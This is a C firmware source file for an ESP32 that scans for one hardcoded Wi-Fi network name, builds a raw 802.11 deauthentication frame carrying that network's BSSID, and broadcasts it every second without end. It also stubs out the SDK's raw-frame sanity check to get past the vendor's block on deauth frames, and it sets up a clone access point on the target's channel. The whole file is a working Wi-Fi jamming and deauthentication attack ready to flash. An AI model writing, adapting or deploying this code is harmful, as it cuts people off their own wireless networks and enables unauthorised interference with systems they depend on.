#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_log.h"
#include "esp_log_level.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include "esp_wifi_default.h"
#include "esp_netif_defaults.h"

#define TARGET_SSID "chuer(16)"
#define DEAUTH_TEMPLATE_LEN 26
#define TAG "main"

static uint8_t deauth_packet[DEAUTH_TEMPLATE_LEN] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};
// wsl_bypasser
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}
void send_deauth() {
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, DEAUTH_TEMPLATE_LEN, false));
}

void wifi_scan_task(void *pvParameters) {
    wifi_scan_config_t scan_conf = {
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = { .active = { .min = 100, .max = 200 } }
    };

    while(1) {
        gpio_set_level(2, 1);
        esp_wifi_scan_start(&scan_conf, true);
        
        uint16_t ap_num = 0;
        esp_wifi_scan_get_ap_num(&ap_num);
        wifi_ap_record_t *ap_records = pvPortMalloc(sizeof(wifi_ap_record_t) * ap_num);
        
        if(ap_records) {
            esp_wifi_scan_get_ap_records(&ap_num, ap_records);
            
            for(int i=0; i<ap_num; i++) {
                if(!strcmp((char*)ap_records[i].ssid, TARGET_SSID)) {
                    ESP_LOGI("WiFi_Scanner","Target detected %s",ap_records[i].ssid);
                    ESP_LOGI("WiFi_Deauther","Channel set to %d",ap_records[i].primary);
                    memcpy(&deauth_packet[10],ap_records[i].bssid, 6);
                    memcpy(&deauth_packet[16],ap_records[i].bssid, 6);
                    ESP_LOGI("Wifi_Deauther","Deauth packet set");
                    wifi_config_t conf = {
                        .ap={
                            .ssid_len = strlen((char*)ap_records[i].ssid),
                            .password = "fhv139hf0jvr9u498yd9suf032",
                            .channel = ap_records[i].primary,
                            .authmode = ap_records[i].authmode,
                            .max_connection = 1,
                        }
                    };
                    memcpy(conf.sta.ssid, ap_records[i].ssid, 32);
                    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &conf));
                    ESP_LOGI("WiFi_Deauther","AP config set");
                    while(1)
                    {
                        send_deauth();
                        ESP_LOGI("WiFi_Deauther","Deauth packet sent");
                        vTaskDelay(pdMS_TO_TICKS(1000));
                    }
                }
            }
            vPortFree(ap_records);
            ESP_LOGE("WiFi_Scanner","Target not found");
        }
        gpio_set_level(2, 0);
        vTaskDelay(pdMS_TO_TICKS(3000));
        
    }
}

__always_inline void wifi_init() {
    ESP_ERROR_CHECK(esp_netif_init());
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    esp_netif_create_default_wifi_sta();
    esp_netif_create_default_wifi_ap();
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
}
__always_inline void gpio_init() { 
    gpio_config_t io_conf = {
        .intr_type = GPIO_INTR_DISABLE,
        .mode = GPIO_MODE_OUTPUT,
        .pin_bit_mask = (1ULL << 2), // GPIO2
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .pull_up_en = GPIO_PULLUP_DISABLE
    };

    ESP_ERROR_CHECK(gpio_config(&io_conf));
}
void app_main() {
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_LOGI(TAG, "Initialized NVS");

    esp_event_loop_create_default();
    ESP_LOGI(TAG, "Initialized event loop");

    wifi_init();
    ESP_LOGI(TAG, "Initialized WiFi");

    gpio_init();
    ESP_LOGI(TAG, "Initialized GPIO");

    xTaskCreatePinnedToCore(wifi_scan_task, "wifi_scan", 4096, NULL, 5, NULL, 1);
    ESP_LOGI(TAG, "Started WiFi scan task");
}